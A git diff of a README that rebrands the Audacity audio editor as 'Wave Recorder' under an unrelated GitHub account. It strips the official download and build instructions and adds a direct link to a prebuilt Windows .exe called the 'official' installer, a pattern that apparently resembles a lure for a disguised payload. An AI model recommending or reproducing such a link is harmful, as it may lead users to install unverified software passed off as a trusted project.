@@ -1,7 +1,7 @@
-# Audacity
+# Wave Recorder
 
 
-[**Audacity**](https://www.audacityteam.org) is an easy-to-use, multi-track audio editor and recorder for Windows, macOS, GNU/Linux and other operating systems.
+[**Wave Recorder**](https://github.com/ankit22222AXONIC/wave-recorder) is an easy-to-use, multi-track audio editor and recorder for Windows, based on Audacity®.
 
 - **Recording** from any real or virtual audio device that is available to the host system.
 - **Export / Import** a wide range of audio formats, extensible with FFmpeg.
@@ -14,16 +14,14 @@
 - **Accessibility** for VI users.
 - **Analysis and visualization** tools to analyze audio or other signal data.
 
-## Users
+## Installation
 
-For end users, the latest Windows and macOS release version of Audacity is available from the [Audacity website](https://www.audacityteam.org/download/).
-Help with using Audacity is available [here](https://audacityteam.org/help/).
+Download the official single-file Windows installer:
+- [**Wave-Recorder-Setup-x64.exe**](https://github.com/ankit22222AXONIC/wave-recorder/releases/latest/download/Wave-Recorder-Setup-x64.exe)
 
-## Developers
-Build instructions are available [here](https://github.com/audacity/audacity/blob/master/BUILDING.md).
+Run the installer and follow the setup wizard. All required DLLs, runtimes, plug-ins, and audio modules are included.
 
-Additional development resources may be found [here](https://audacity.gitbook.io/dev/).
+## License & Credits
 
-## License
-
-Audacity is open source software licensed GPLv3. Most code files are GPLv2-or-later, with the notable exceptions being /lib-src (which contains third party libraries), as well as VST3-related code. Documentation is licensed CC-by 3.0 unless otherwise noted. Details can be found in the [license file](LICENSE.txt).
+Wave Recorder is free, open source software licensed under GPLv3.
+Original Audacity code is Copyright © 2024 Audacity Team. Most code files are GPLv2-or-later, with third party libraries in `/lib-src` and VST3 SDK components. Documentation is licensed CC-by 3.0 unless otherwise noted. Details can be found in the [license file](LICENSE.txt).
